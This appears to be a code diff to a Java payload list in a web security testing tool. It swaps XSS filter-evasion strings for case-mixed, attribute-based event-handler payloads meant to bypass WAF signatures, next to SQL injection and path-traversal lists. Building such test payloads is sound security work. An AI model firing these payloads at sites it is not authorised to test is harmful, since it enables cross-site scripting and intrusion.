@@ -53,12 +53,15 @@ public class PayloadRepository {
         "' || '1'='1"
     );
 
+    // No literal <script>, no eval/atob, no embedded newlines (splitPayloads splits on \R):
+    // those are hard WAF signatures / break the one-payload-per-line contract. Case-mix and
+    // attribute-obfuscation bypasses only.
     public static final List<String> XSS_EVASION = Arrays.asList(
         "<img src=x oNeRror=confirm(1)>",
         "<svG/onload=confirm(1)>",
-        "<a href=\"javasc\nript:confirm(1)\">x</a>",
-        "<img src=x:x onerror=eval(atob('Y29uZmlybSgxKQ=='))>",
-        "<svg><script>confirm&#40;1&#41;</script>"
+        "<deTails/open/ontoggle=confirm(1)>",
+        "<img/src/onerror=confirm`1`>",
+        "<svg><animate onbegin=confirm(1) attributeName=x dur=1s>"
     );
 
     public static final List<String> PATH_TRAVERSAL_EVASION = Arrays.asList(
